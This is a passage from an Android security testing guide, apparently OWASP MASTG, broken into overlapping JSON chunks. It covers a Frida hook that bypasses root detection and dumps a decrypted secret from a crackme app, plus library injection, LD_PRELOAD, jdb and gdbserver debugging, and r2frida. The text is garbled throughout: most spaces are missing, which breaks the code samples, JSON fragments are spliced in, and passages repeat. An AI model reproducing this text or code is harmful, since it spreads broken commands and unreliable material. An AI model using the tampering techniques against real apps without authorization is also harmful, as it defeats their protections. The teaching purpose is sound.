Sowewantthereturnvalueofsg.vantagepoint.a.a.a. Insteadofreversingthedecryptionroutinestoreconstructthesecretkey,youcansimplyignoreallthedecryptionlogic in the app and hook the sg.vantagepoint.a.a.a function to catch its return value. Here is the complete script that preventsexitingonrootandinterceptsthedecryptionofthesecretstring: setImmediate(function(){ //preventtimeout console.log(\"[*]Startingscript\"); Java.perform(function(){ varmainActivity =Java.use(\"sg.vantagepoint.uncrackable1.MainActivity\"); mainActivity.a.implementation =function(v){ console.log(\"[*]MainActivity.acalled\"); }; console.log(\"[*]MainActivity.amodified\"); varaaClass =Java.use(\"sg.vantagepoint.a.a\"); aaClass.a.implementation =function(arg1,arg2){ varretval =this.a(arg1,arg2); varpassword =''; for(vari=0;i<retval.length;i++){ password +=String.fromCharCode(retval[i]); } console.log(\"[*]Decrypted:\" +password); return retval; }; console.log(\"[*]sg.vantagepoint.a.a.amodified\"); }); }); After running the script in Frida and seeing the “[*] sg.vantagepoint.a.a.a modified” message in the console, enter a randomvaluefor“secretstring”andpressverify. Youshouldgetanoutputsimilartothefollowing: $frida -U-fowasp.mstg.uncrackable1 -luncrackable1.js --no-pause [*]Startingscript [USB::AndroidEmulator5554::sg.vantagepoint.uncrackable1]->[*]MainActivity.amodified [*]sg.vantagepoint.a.a.amodified [*]MainActivity.acalled. [*]Decrypted:Iwanttobelieve Thehookedfunctionoutputtedthedecryptedstring. Youextractedthesecretstringwithouthavingtodivetoodeepinto theapplicationcodeanditsdecryptionroutines. You’venowcoveredthebasicsofstatic/dynamicanalysisonAndroid. Ofcourse,theonlywaytoreallylearnitishands-on experience: buildyourownprojectsinAndroidStudio,observehowyourcodegetstranslatedintobytecodeandnative code,andtrytocrackourchallenges. In the remaining sections, we’ll introduce a few advanced subjects, including process exploration, kernel modules and dynamicexecution. 139\\nGetting Loaded Classes and Methods Dynamically Platform: android YoucanusethecommandJavaintheFridaCLItoaccesstheJavaruntimeandretrieveinformationfromtherunningapp. Rememberthat,unlikeFridaforiOS,inAndroidyouneedtowrapyourcodeinsideaJava.performfunction. Thus,it’s moreconvenienttouseFridascriptstoe.g.getalistofloadedJavaclassesandtheircorrespondingmethodsandfields orformorecomplexinformationgatheringorinstrumentation. Onesuchscriptsislistedbelow. Thescripttolistclass’s methodsusedbelowisavailableonGithub. //GetlistofloadedJavaclassesandmethods //Filename:java_class_listing.js Java.perform(function(){ Java.enumerateLoadedClasses({ onMatch:function(className){ console.log(className); describeJavaClass(className); }, onComplete:function(){} }); }); //Getthemethodsandfields function describeJavaClass(className){ varjClass =Java.use(className); console.log(JSON.stringify({ _name:className, _methods:Object.getOwnPropertyNames(jClass.__proto__).filter(function(m) { return !m.startsWith('$')//filteroutFridarelatedspecialproperties ||m=='class'||m=='constructor'//optional }), _fields:jClass.class.getFields().map(function(f){ return(f.toString()); }) },null,2)); } Aftersavingthescripttoafilecalledjava_class_listing.js,youcantellFridaCLItoloaditbyusingtheflag-landinjectit totheprocessIDspecifiedby-p. frida -U-ljava_class_listing.js -p<pid> //Output [HuaweiNexus6P::sg.vantagepoint.helloworldjni]-> ... com.scottyab.rootbeer.sample.MainActivity { \"_name\":\"com.scottyab.rootbeer.sample.MainActivity\", \"_methods\":[ ... \"beerView\", \"checkRootImageViewList\", \"floatingActionButton\", \"infoDialog\", \"isRootedText\", \"isRootedTextDisclaimer\", \"mActivity\", \"GITHUB_LINK\" ], \"_fields\":[ \"publicstaticfinalintandroid.app.Activity.DEFAULT_KEYS_DIALER\", ... Giventheverbosityoftheoutput,thesystemclassescanbefilteredoutprogrammaticallytomakeoutputmorereadable andrelevanttotheusecase. Library Injection Platform: android Intheprevioussectionwelearnedaboutpatchingapplicationcodetoassistinouranalysis,butthisapproachhasseveral limitations. Forinstance,you’dliketologeverythingthat’sbeingsentoverthenetworkwithouthavingtoperformaMITM 140\\nattack. Forthis you’dhave topatch allpossible callsto thenetwork APIs, which canquickly becomeimpractical when dealingwithlargeapplications. Inaddition,thefactthatpatchingisuniquetoeachapplicationcanalsobeconsidereda shortcoming,asthiscodecannotbeeasilyreused. Using library injection you can develop reusable libraries and inject them to different applications, effectively making thembehavedifferentlywithouthavingtomodifytheiroriginalsourcecode. ThisisknownasDLLinjectiononWindows (broadlyusedtomodifyandbypassanti-cheatmechanismsingames),LD_PRELOADonLinuxandDYLD_INSERT_LIBRARIES onmacOS.OnAndroidandiOS,acommonexampleisusingtheFridaGadgetwheneverFrida’sso-calledInjectedmode ofoperationisn’tsuitable(i.e.youcannotruntheFridaserveronthetargetdevice). Inthissituation,youcaninjectthe Gadgetlibrarybyusingthesamemethodsyou’regoingtolearninthissection. Libraryinjectionisdesirableinmanysituationssuchas: • Performingprocessintrospection(e.g.listingclasses, tracingmethodcalls, monitoringaccessedfiles, monitoring networkaccess,obtainingdirectmemoryaccess). • Supporting or replacing existing code with your own implementations (e.g. replace a function that should give randomnumbers). • Introducingnewfeaturestoanexistingapplication. • Debuggingandfixingelusiveruntimebugsoncodeforwhichyoudon’thavetheoriginalsource. • Enabledynamictestingonanon-rooteddevice(e.g.withFrida). Inthissection,wewilllearnabouttechniquesforperforminglibraryinjectiononAndroid,whichbasicallyconsistofpatch- ingtheapplicationcode(smaliornative)oralternativelyusingtheLD_PRELOADfeatureprovidedbytheOSloaderitself. Patching the Application’s Smali Code AnAndroidapplication’sdecompiledsmalicodecanbepatchedtointroduceacalltoSystem.loadLibrary. Thefollowing smalipatchinjectsalibrarynamedlibinject.so: const-stringv0,\"inject\" invoke-static{v0},Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V Ideally you should insert the above code early in the application lifecycle, for instance in the onCreate method. It is importanttoremembertoaddthelibrarylibinject.sointherespectivearchitecturefolder(armeabi-v7a,arm64-v8a,x86) ofthelibfolderintheAPK.Finally,youneedtore-signtheapplicationbeforeusingit. A well-known use case of this technique is loading the Frida gadget to an application, especially while working on a non-rooteddevice(thisiswhatobjection patchapkbasicallydoes). Patching Application’s Native Library Many Androidapplications use native code in addition to Java code for various performance and security reasons. The",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 69
    }
  },
  {
    "text": "the onCreate method. It is importanttoremembertoaddthelibrarylibinject.sointherespectivearchitecturefolder(armeabi-v7a,arm64-v8a,x86) ofthelibfolderintheAPK.Finally,youneedtore-signtheapplicationbeforeusingit. A well-known use case of this technique is loading the Frida gadget to an application, especially while working on a non-rooteddevice(thisiswhatobjection patchapkbasicallydoes). Patching Application’s Native Library Many Androidapplications use native code in addition to Java code for various performance and security reasons. The nativecodeispresentintheformofELFsharedlibraries. AnELFexecutableincludesalistofsharedlibraries(dependen- cies)thatarelinkedtotheexecutableforittofunctionoptimally. Thislistcanbemodifiedtoinsertanadditionallibrary tobeinjectedintotheprocess. ModifyingtheELFfilestructuremanuallytoinjectalibrarycanbecumbersomeandpronetoerrors. However,thistask canbeperformedwithrelativeeaseusingLIEF(LibrarytoInstrumentExecutableFormats). Usingitrequiresonlyafew linesofPythoncodeasshownbelow: importlief libnative =lief.parse(\"libnative.so\") libnative.add_library(\"libinject.so\")#Injection! libnative.write(\"libnative.so\") Intheaboveexample,libinject.solibraryisinjectedasadependencyofanativelibrary(libnative.so),whichtheapplication alreadyloadsbydefault. FridagadgetcanbeinjectedintoanapplicationusingthisapproachasexplainedindetailinLIEF’s documentation. Asintheprevioussection,itisimportanttorememberaddingthelibrarytotherespectivearchitecture libfolderintheAPKandfinallyre-signingtheapplication. 141\\nPreloading Symbols Abovewelookedintotechniqueswhichrequiresomekindofmodificationoftheapplication’scode. Alibrarycanalsobe injectedintoaprocessusingfunctionalitiesofferedbytheloaderoftheoperatingsystem. OnAndroid,whichisaLinux basedOS,youcanloadanadditionallibrarybysettingtheLD_PRELOADenvironmentvariable. Astheld.somanpagestates,symbolsloadedfromthelibrarypassedusingLD_PRELOADalwaysgetprecedence,i.e.they are searched first by the loader while resolving the symbols, effectively overriding the original ones. This feature is oftenusedtoinspecttheinputparametersofsomecommonlyusedlibcfunctionssuchasfopen,read,write,strcmp, etc., specially in obfuscated programs, where understanding their behavior may be challenging. Therefore, having an insightonwhichfiles arebeingopenedor whichstringsarebeing comparedmaybevery valuable. Thekeyidea here is“functionwrapping”,meaningthatyoucannotpatchsystemcallssuchaslibc’sfopen,butyoucanoverride(wrap)it includingcustomcodethatwill,forinstance,printtheinputparametersforyouandstillcalltheoriginalfopenremaining transparenttothecaller. OnAndroid,settingLD_PRELOADisslightlydifferentcomparedtootherLinuxdistributions. Ifyourecallfromthe“Platform Overview” section, every application in Android is forked from Zygote, which is started very early during the Android boot-up. Thus, setting LD_PRELOAD on Zygote is not possible. As a workaround for this problem, Android supports the setprop(setproperty)functionality. Belowyoucanseeanexampleforanapplicationwithpackagenamecom.foo.bar (notetheadditionalwrap. prefix): setpropwrap.com.foo.barLD_PRELOAD=/data/local/tmp/libpreload.so PleasenotethatifthelibrarytobepreloadeddoesnothaveSELinuxcontextassigned,fromAndroid5.0(APIlevel 21)onwards,youneedtodisableSELinuxtomakeLD_PRELOADwork,whichmayrequireroot. Debugging Platform: android Sofar,you’vebeenusingstaticanalysistechniqueswithoutrunningthetargetapps. Intherealworld,especiallywhen reversingmalwareormorecomplexapps,purestaticanalysisisverydifficult. Observingandmanipulatinganappduring runtimemakesitmuch,mucheasiertodecipheritsbehavior. Next,we’llhavealookatdynamicanalysismethodsthat helpyoudojustthat. Androidappssupporttwodifferenttypesofdebugging: DebuggingontheleveloftheJavaruntimewiththeJavaDebug Wire Protocol (JDWP), and Linux/Unix-style ptrace-based debugging on the native layer, both of which are valuable to reverseengineers. Debugging Release Apps DalvikandARTsupporttheJDWP,aprotocolforcommunicationbetweenthedebuggerandtheJavavirtualmachine(VM) thatitdebugs. JDWPisastandarddebuggingprotocolthat’ssupportedbyallcommandlinetoolsandJavaIDEs,including jdb,IntelliJ,andEclipse. Android’simplementationofJDWPalsoincludeshooksforsupportingextrafeaturesimplemented bytheDalvikDebugMonitorServer(DDMS). AJDWPdebuggerallowsyoutostepthroughJavacode,setbreakpointsonJavamethods,andinspectandmodifylocal andinstancevariables. You’lluseaJDWPdebuggermostofthetimeyoudebug“normal”Androidapps(i.e., appsthat don’tmakemanycallstonativelibraries). Inthefollowingsection,we’llshowhowtosolvetheUnCrackableAppforAndroidLevel1withjdbalone. Notethatthisis notanefficientwaytosolvethiscrackme. ActuallyyoucandoitmuchfasterwithFridaandothermethods,whichwe’ll introducelaterintheguide. This,however,servesasanintroductiontothecapabilitiesoftheJavadebugger. Debugging with jdb The adb command line tool was introduced in the “Android Basic Security Testing” chapter. You can use its adb jdwp commandtolisttheprocessIDsofalldebuggableprocessesrunningontheconnecteddevice(i.e.,processeshostinga 142\\nJDWPtransport). Withtheadb forwardcommand,youcanopenalisteningsocketonyourhostcomputerandforward thissocket’sincomingTCPconnectionstotheJDWPtransportofachosenprocess. $adbjdwp 12167 $adbforwardtcp:7777jdwp:12167 You’renowreadytoattachjdb. Attachingthedebugger,however,causestheapptoresume,whichyoudon’twant. You wanttokeepitsuspendedsothatyoucanexplorefirst. Topreventtheprocessfromresuming,pipethesuspendcommand intojdb: ${echo \"suspend\";cat;}|jdb-attach localhost:7777 Initializingjdb... >Allthreadssuspended. > You’re now attached to the suspended process and ready to go ahead with the jdb commands. Entering ? prints the completelistofcommands. Unfortunately,theAndroidVMdoesn’tsupportallavailableJDWPfeatures. Forexample,the redefine command, which would let you redefine a class code is not supported. Another important restriction is that linebreakpointswon’tworkbecausethereleasebytecodedoesn’tcontainlineinformation. Methodbreakpointsdowork, however. Usefulworkingcommandsinclude: • classes: listallloadedclasses • class/methods/fieldsclassid: Printdetailsaboutaclassandlistitsmethodsandfields • locals: printlocalvariablesincurrentstackframe • print/dumpexpr: printinformationaboutanobject • stopinmethod: setamethodbreakpoint • clearmethod: removeamethodbreakpoint • setlvalue=expr: assignnewvaluetofield/variable/arrayelement Let’s revisit the decompiled code from the UnCrackable App for Android Level 1 and think about possible solutions. A goodapproachwouldbesuspendingtheappinastatewherethesecretstringisheldinavariableinplaintextsoyou canretrieveit. Unfortunately,youwon’tgetthatfarunlessyoudealwiththeroot/tamperingdetectionfirst. Reviewthecodeandyou’llseethatthemethodsg.vantagepoint.uncrackable1.MainActivity.adisplaysthe“Thisin unacceptable...”messagebox. ThismethodcreatesanAlertDialogandsetsalistenerclassfortheonClickevent. This class (named b) has a callback method will terminatesthe app once the user taps theOK button. Toprevent the user fromsimplycancelingthedialog,thesetCancelablemethodiscalled. private void a(final Stringtitle){ final AlertDialogcreate =newAlertDialog$Builder((Context)this).create(); create.setTitle((CharSequence)title); create.setMessage((CharSequence)\"Thisinunacceptable.Theappisnowgoingtoexit.\"); create.setButton(-3,(CharSequence)\"OK\",(DialogInterface$OnClickListener)newb(this)); create.setCancelable(false); create.show(); } Youcanbypassthiswithalittleruntimetampering. Withtheappstillsuspended,setamethodbreakpointonandroid. app.Dialog.setCancelableandresumetheapp. >stop inandroid.app.Dialog.setCancelable Setbreakpointandroid.app.Dialog.setCancelable >resume Allthreadsresumed. > Breakpointhit: \"thread=main\",android.app.Dialog.setCancelable(),line=1,110bci=0 main[1] TheappisnowsuspendedatthefirstinstructionofthesetCancelablemethod. Youcanprinttheargumentspassedto setCancelablewiththelocalscommand(theargumentsareshownincorrectlyunder“localvariables”). main[1]locals Methodarguments: Localvariables: flag=true 143\\nsetCancelable(true)wascalled,sothiscan’tbethecallwe’relookingfor. Resumetheprocesswiththeresumecom- mand. main[1]resume Breakpointhit: \"thread=main\",android.app.Dialog.setCancelable(),line=1,110bci=0 main[1]locals flag=false You’venowreachedacalltosetCancelablewiththeargumentfalse. Setthevariabletotruewiththesetcommand andresume. main[1]setflag=true flag=true=true main[1]resume Repeatthisprocess,settingflagtotrueeachtimethebreakpointisreached,untilthealertboxisfinallydisplayed(the breakpointwillbereachedfiveorsixtimes). Thealertboxshouldnowbecancelable! Tapthescreennexttotheboxand itwillclosewithoutterminatingtheapp. Nowthattheanti-tamperingisoutoftheway,you’rereadytoextractthesecretstring! Inthe“staticanalysis”section,you sawthatthestringisdecryptedwithAES,thencomparedwiththestringinputtothemessagebox. Themethodequals ofthejava.lang.Stringclasscomparesthestringinputwiththesecretstring. Setamethodbreakpointonjava.lang. String.equals,enteranarbitrarytextstringintheeditfield,andtapthe“verify”button. Oncethebreakpointisreached, youcanreadthemethodargumentwiththelocalscommand. >stop injava.lang.String.equals Setbreakpointjava.lang.String.equals > Breakpointhit: \"thread=main\",java.lang.String.equals(),line=639bci=2 main[1]locals Methodarguments: Localvariables: other= \"radiusGravity\" main[1]cont Breakpointhit: \"thread=main\",java.lang.String.equals(),line=639bci=2 main[1]locals Methodarguments: Localvariables: other= \"Iwanttobelieve\" main[1]cont Thisistheplaintextstringyou’relookingfor! Debugging with an IDE SettingupaprojectinanIDEwiththedecompiledsourcesisaneattrickthatallowsyoutosetmethodbreakpointsdirectly inthesourcecode. Inmostcases,youshouldbeabletosingle-stepthroughtheappandinspectthestateofvariables withtheGUI.Theexperiencewon’tbeperfect,it’snottheoriginalsourcecodeafterall,soyouwon’tbeabletosetline breakpointsandthingswillsometimessimplynotworkcorrectly. Thenagain,reversingcodeisnevereasy,andefficiently navigatinganddebuggingplainoldJavacodeisaprettyconvenientwayofdoingit. Asimilarmethodhasbeendescribed intheNetSPIblog. TosetupIDEdebugging,firstcreateyourAndroidprojectinIntelliJandcopythedecompiledJavasourcesintothesource folderasdescribedaboveinthe“ReviewingDecompiledJavaCode”section. Onthedevice, choosetheappasdebug apponthe“Developeroptions”(UnCrackableAppforAndroidLevel1inthistutorial),andmakesureyou’veswitchedon the“WaitForDebugger”feature. Onceyoutaptheappiconfromthelauncher,itwillbesuspendedin“WaitForDebugger”mode. 144\\nNowyoucansetbreakpointsandattachtotheappprocesswiththe“AttachDebugger”toolbarbutton. Notethatonlymethodbreakpointsworkwhendebugginganappfromdecompiledsources. Onceamethodbreakpoint isreached,you’llgetthechancetosinglestepduringthemethodexecution. 145\\nAfteryouchoosetheappfromthelist,thedebuggerwillattachtotheappprocessandyou’llreachthebreakpointthatwas setontheonCreatemethod. Thisapptriggersanti-debuggingandanti-tamperingcontrolswithintheonCreatemethod. That’swhysettingabreakpointontheonCreatemethodjustbeforetheanti-tamperingandanti-debuggingchecksare performedisagoodidea. Next, single-step through the onCreate method by clicking “Force Step Into” in Debugger view. The “Force Step",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 70
    }
  },
  {
    "text": "other= \"Iwanttobelieve\" main[1]cont Thisistheplaintextstringyou’relookingfor! Debugging with an IDE SettingupaprojectinanIDEwiththedecompiledsourcesisaneattrickthatallowsyoutosetmethodbreakpointsdirectly inthesourcecode. Inmostcases,youshouldbeabletosingle-stepthroughtheappandinspectthestateofvariables withtheGUI.Theexperiencewon’tbeperfect,it’snottheoriginalsourcecodeafterall,soyouwon’tbeabletosetline breakpointsandthingswillsometimessimplynotworkcorrectly. Thenagain,reversingcodeisnevereasy,andefficiently navigatinganddebuggingplainoldJavacodeisaprettyconvenientwayofdoingit. Asimilarmethodhasbeendescribed intheNetSPIblog. TosetupIDEdebugging,firstcreateyourAndroidprojectinIntelliJandcopythedecompiledJavasourcesintothesource folderasdescribedaboveinthe“ReviewingDecompiledJavaCode”section. Onthedevice, choosetheappasdebug apponthe“Developeroptions”(UnCrackableAppforAndroidLevel1inthistutorial),andmakesureyou’veswitchedon the“WaitForDebugger”feature. Onceyoutaptheappiconfromthelauncher,itwillbesuspendedin“WaitForDebugger”mode. 144\\nNowyoucansetbreakpointsandattachtotheappprocesswiththe“AttachDebugger”toolbarbutton. Notethatonlymethodbreakpointsworkwhendebugginganappfromdecompiledsources. Onceamethodbreakpoint isreached,you’llgetthechancetosinglestepduringthemethodexecution. 145\\nAfteryouchoosetheappfromthelist,thedebuggerwillattachtotheappprocessandyou’llreachthebreakpointthatwas setontheonCreatemethod. Thisapptriggersanti-debuggingandanti-tamperingcontrolswithintheonCreatemethod. That’swhysettingabreakpointontheonCreatemethodjustbeforetheanti-tamperingandanti-debuggingchecksare performedisagoodidea. Next, single-step through the onCreate method by clicking “Force Step Into” in Debugger view. The “Force Step Into” optionallowsyoutodebugtheAndroidframeworkfunctionsandcoreJavaclassesthatarenormallyignoredbydebug- gers. Once you “Force Step Into”, the debugger will stop at the beginning of the next method, which is the a method of the classsg.vantagepoint.a.c. 146\\nThismethodsearchesforthe“su”binarywithinalistofdirectories(/system/xbinandothers). Sinceyou’rerunningthe apponarooteddevice/emulator,youneedtodefeatthischeckbymanipulatingvariablesand/orfunctionreturnvalues. Youcanseethedirectorynamesinsidethe“Variables”windowbyclicking“StepOver”theDebuggerviewtostepinto andthroughtheamethod. StepintotheSystem.getenvmethodwiththe“ForceStepInto”feature. Afteryougetthecolon-separateddirectorynames,thedebuggercursorwillreturntothebeginningoftheamethod,not to the next executable line. This happens because you’re working on the decompiled code instead of the source code. Thisskippingmakesfollowingthecodeflowcrucialtodebuggingdecompiledapplications. Otherwise,identifyingthenext linetobeexecutedwouldbecomecomplicated. Ifyoudon’twanttodebugcoreJavaandAndroidclasses,youcanstepoutofthefunctionbyclicking“StepOut”inthe Debuggerview. Using“ForceStepInto”mightbeagoodideaonceyoureachthedecompiledsourcesand“StepOut”of thecoreJavaandAndroidclasses. Thiswillhelpspeedupdebuggingwhileyoukeepaneyeonthereturnvaluesofthe coreclassfunctions. 147\\nAfter the a method gets the directory names, it will search for the su binary within these directories. To defeat this check, step through the detection method and inspect the variable content. Once execution reaches a location where thesubinarywouldbedetected,modifyoneofthevariablesholdingthefilenameordirectorynamebypressingF2or right-clickingandchoosing“SetValue”. Onceyoumodifythebinarynameorthedirectoryname,File.existsshouldreturnfalse. 148\\nThisdefeatsthefirstrootdetectioncontroloftheapp. Theremaininganti-tamperingandanti-debuggingcontrolscanbe defeatedinsimilarwayssothatyoucanfinallyreachthesecretstringverificationfunctionality. Thesecretcodeisverifiedbythemethodaofclasssg.vantagepoint.uncrackable1.a. Setabreakpointonmethoda and“ForceStepInto”whenyoureachthebreakpoint. Then,single-stepuntilyoureachthecalltoString.equals. This iswhereuserinputiscomparedwiththesecretstring. Youcanseethesecretstringinthe“Variables”viewwhenyoureachtheString.equalsmethodcall. 149\\nDebugging Native Code NativecodeonAndroidispackedintoELFsharedlibrariesandrunsjustlikeanyothernativeLinuxprogram. Consequently, youcandebugitwithstandardtools(includingGDBandbuilt-inIDEdebuggerssuchasIDAPro)aslongastheysupport thedevice’sprocessorarchitecture(mostdevicesarebasedonARMchipsets,sothisisusuallynotanissue). You’llnowsetupyourJNIdemoapp,HelloWorld-JNI.apk,fordebugging. It’sthesameAPKyoudownloadedin“Statically AnalyzingNativeCode”. Useadb installtoinstallitonyourdeviceoronanemulator. adbinstallHelloWorld-JNI.apk If you followed the instructions at the beginning of this chapter, you should already have the Android NDK. It contains prebuiltversionsofgdbserverforvariousarchitectures. Copythegdbserverbinarytoyourdevice: 150\\nadbpush $NDK/prebuilt/android-arm/gdbserver/gdbserver/data/local/tmp The gdbserver --attach command causes gdbserver to attach to the running process and bind to the IP address and portspecifiedincomm,whichinthiscaseisaHOST:PORTdescriptor. StartHelloWorldJNIonthedevice,thenconnectto thedeviceanddeterminethePIDoftheHelloWorldJNIprocess(sg.vantagepoint.helloworldjni). Thenswitchtotheroot userandattachgdbserver: $adbshell $ps |grep helloworld u0_a164 12690201 153340051692ffffffff00000000Ssg.vantagepoint.helloworldjni $su ##/data/local/tmp/gdbserver--attachlocalhost:123412690 Attached;pid=12690 Listeningonport1234 Theprocessisnowsuspended,andgdbserverislisteningfordebuggingclientsonport1234. Withthedeviceconnected viaUSB,youcanforwardthisporttoalocalportonthehostwiththeabd forwardcommand: adbforwardtcp:1234tcp:1234 You’llnowusetheprebuiltversionofgdbincludedintheNDKtoolchain. $$TOOLCHAIN/bin/gdblibnative-lib.so GNUgdb (GDB)7.11 (...) Readingsymbolsfromlibnative-lib.so...(nodebuggingsymbolsfound)...done. (gdb)targetremote:1234 Remotedebuggingusing:1234 0xb6e0f124in ??() Youhavesuccessfullyattachedtotheprocess! Theonlyproblemisthatyou’realreadytoolatetodebugtheJNIfunction StringFromJNI;itonlyrunsonce, atstartup. Youcansolvethisproblembyactivatingthe“WaitforDebugger”option. GotoDeveloperOptions->SelectdebugappandpickHelloWorldJNI,thenactivatetheWaitfordebuggerswitch. Thenterminateandre-launchtheapp. Itshouldbesuspendedautomatically. OurobjectiveistosetabreakpointatthefirstinstructionofthenativefunctionJava_sg_vantagepoint_helloworldjni_- MainActivity_stringFromJNIbeforeresumingtheapp. Unfortunately,thisisn’tpossibleatthispointintheexecution becauselibnative-lib.soisn’tyetmappedintoprocessmemory,it’sloadeddynamicallyduringruntime. Togetthis working,you’llfirstusejdbtogentlychangetheprocessintothedesiredstate. First,resumeexecutionoftheJavaVMbyattachingjdb. Youdon’twanttheprocesstoresumeimmediatelythough,so pipethesuspendcommandintojdb: $adbjdwp 14342 $adbforwardtcp:7777jdwp:14342 ${echo \"suspend\";cat;}|jdb-attach localhost:7777 Next,suspendtheprocesswheretheJavaruntimeloadslibnative-lib.so. Injdb,setabreakpointatthejava.lang. System.loadLibrary method and resume the process. After the breakpoint has been reached, execute the step up command,whichwillresumetheprocessuntilloadLibraryreturns. Atthispoint,libnative-lib.sohasbeenloaded. >stop injava.lang.System.loadLibrary >resume Allthreadsresumed. Breakpointhit: \"thread=main\",java.lang.System.loadLibrary(),line=988bci=0 >stepup main[1]stepup > Stepcompleted: \"thread=main\",sg.vantagepoint.helloworldjni.MainActivity.<clinit>(),line=12 bci=5 main[1] Executegdbservertoattachtothesuspendedapp. ThiswillcausetheapptobesuspendedbyboththeJavaVMandthe Linuxkernel(creatingastateof“double-suspension”). 151\\n$adbforwardtcp:1234tcp:1234 $$TOOLCHAIN/arm-linux-androideabi-gdblibnative-lib.so GNUgdb (GDB)7.7 Copyright (C)2014FreeSoftwareFoundation,Inc. (...) (gdb)targetremote:1234 Remotedebuggingusing:1234 0xb6de83b8in ??() JNI Tracing Platform: android AsdetailedinsectionReviewingDisassembledNativeCode,thefirstargumentpassedtoeveryJNIfunctionisaJNIinter- facepointer. ThispointercontainsatableoffunctionsthatallowsnativecodetoaccesstheAndroidRuntime. Identifying callstothesefunctionscanhelpwithunderstandinglibraryfunctionality,suchaswhatstringsarecreatedorJavamethods arecalled. jnitraceisaFridabasedtoolsimilartofrida-tracewhichspecificallytargetstheusageofAndroid’sJNIAPIbynativelibraries, providingaconvenientwaytoobtainJNImethodtracesincludingargumentsandreturnvalues. Youcaneasilyinstallitbyrunningpip install jnitraceandrunitstraightawayasfollows: jnitrace -llibnative-lib.sosg.vantagepoint.helloworldjni The-loptioncanbeprovidedmultipletimestotracemultiplelibraries,or*canbeprovidedtotracealllibraries. This,however,mayprovidealotofoutput. IntheoutputyoucanseethetraceofacalltoNewStringUTFmadefromthenativecode(itsreturnvalueisthengiven backtoJavacode,seesection“ReviewingDisassembledNativeCode”formoredetails). Notehowsimilarlytofrida-trace, theoutputiscolorizedhelpingtovisuallydistinguishthedifferentthreads. When tracing JNI API calls you can see the thread ID at the top, followed by the JNI method call including the method name,theinputargumentsandthereturnvalue. InthecaseofacalltoaJavamethodfromnativecode,theJavamethod argumentswillalsobe supplied. Finallyjnitracewillattempt tousetheFridabacktracinglibrarytoshowwheretheJNI callwasmadefrom. Tolearnmoreaboutalloptionsforadvancedusage,checkthedocumentationonthejnitraceGitHubpage. Monitoring System Logs Platform: android OnAndroidyoucaneasilyinspectthelogofsystemmessagesbyusingLogcat. TherearetwowaystoexecuteLogcat: • LogcatispartofDalvikDebugMonitorServer (DDMS)inAndroidStudio. Iftheappisrunningindebugmode,the logoutputwillbeshownintheAndroidMonitorontheLogcattab. Youcanfiltertheapp’slogoutputbydefining patternsinLogcat. 152\\n• YoucanexecuteLogcatwithadbtostorethelogoutputpermanently: adblogcat >logcat.log Withthefollowingcommandyoucanspecificallygrepforthelogoutputoftheappinscope,justinsertthepackagename. OfcourseyourappneedstoberunningforpstobeabletogetitsPID. adblogcat |grep \"$(adbshellps |grep <package-name>|awk'{print$2}')\" Runtime Reverse Engineering Platform: android Runtimereverseengineeringcanbeseenastheon-the-flyversionofreverseengineeringwhereyoudon’thavethebinary datatoyourhostcomputer. Instead,you’llanalyzeitstraightfromthememoryoftheapp. We’llkeepusingtheHelloWorldJNIapp,openasessionwithr2fridar2frida://usb//sg.vantagepoint.helloworldjni andyoucanstartbydisplayingthetargetbinaryinformationbyusingthe:icommand: [0x00000000]>:i arch arm bits 64 os linux pid 13215 uid 10096 objc false runtime V8 java true cylang false pageSize 4096 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false cwd / dataDir /data/user/0/sg.vantagepoint.helloworldjni codeCacheDir /data/user/0/sg.vantagepoint.helloworldjni/code_cache extCacheDir /storage/emulated/0/Android/data/sg.vantagepoint.helloworldjni/cache obbDir /storage/emulated/0/Android/obb/sg.vantagepoint.helloworldjni filesDir /data/user/0/sg.vantagepoint.helloworldjni/files noBackupDir /data/user/0/sg.vantagepoint.helloworldjni/no_backup codePath /data/app/sg.vantagepoint.helloworldjni-1/base.apk packageName sg.vantagepoint.helloworldjni androidId c92f43af46f5578d cacheDir /data/local/tmp jniEnv 0x7d30a43c60 Searchallsymbolsofacertainmodulewith:is <lib>,e.g.:is libnative-lib.so. [0x00000000]>\\islibnative-lib.so [0x00000000]> 153\\nWhich are empty in this case. Alternatively, you might prefer to look into the imports/exports. For example, list the importswith:ii <lib>: [0x00000000]>:iilibnative-lib.so 0x7dbe1159d0f__cxa_finalize/system/lib64/libc.so 0x7dbe115868f__cxa_atexit/system/lib64/libc.so Andlisttheexportswith:iE <lib>: [0x00000000]>:iElibnative-lib.so 0x7d1c49954cfJava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Forbigbinariesit’srecommendedtopipetheoutputtotheinternallessprogrambyappending~..,i.e.\\iiliban- droid_runtime.so~.. (ifnot,forthisbinary,you’dgetalmost2500linesprintedtoyourterminal). ThenextthingyoumightwanttolookatarethecurrentlyloadedJavaclasses: [0x00000000]>\\ic~sg.vantagepoint.helloworldjni sg.vantagepoint.helloworldjni.MainActivity Listclassfields:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 71
    }
  },
  {
    "text": "codePath /data/app/sg.vantagepoint.helloworldjni-1/base.apk packageName sg.vantagepoint.helloworldjni androidId c92f43af46f5578d cacheDir /data/local/tmp jniEnv 0x7d30a43c60 Searchallsymbolsofacertainmodulewith:is <lib>,e.g.:is libnative-lib.so. [0x00000000]>\\islibnative-lib.so [0x00000000]> 153\\nWhich are empty in this case. Alternatively, you might prefer to look into the imports/exports. For example, list the importswith:ii <lib>: [0x00000000]>:iilibnative-lib.so 0x7dbe1159d0f__cxa_finalize/system/lib64/libc.so 0x7dbe115868f__cxa_atexit/system/lib64/libc.so Andlisttheexportswith:iE <lib>: [0x00000000]>:iElibnative-lib.so 0x7d1c49954cfJava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Forbigbinariesit’srecommendedtopipetheoutputtotheinternallessprogrambyappending~..,i.e.\\iiliban- droid_runtime.so~.. (ifnot,forthisbinary,you’dgetalmost2500linesprintedtoyourterminal). ThenextthingyoumightwanttolookatarethecurrentlyloadedJavaclasses: [0x00000000]>\\ic~sg.vantagepoint.helloworldjni sg.vantagepoint.helloworldjni.MainActivity Listclassfields: [0x00000000]>:icsg.vantagepoint.helloworldjni.MainActivity~sg.vantagepoint.helloworldjni publicnativejava.lang.Stringsg.vantagepoint.helloworldjni.MainActivity.stringFromJNI() publicsg.vantagepoint.helloworldjni.MainActivity() 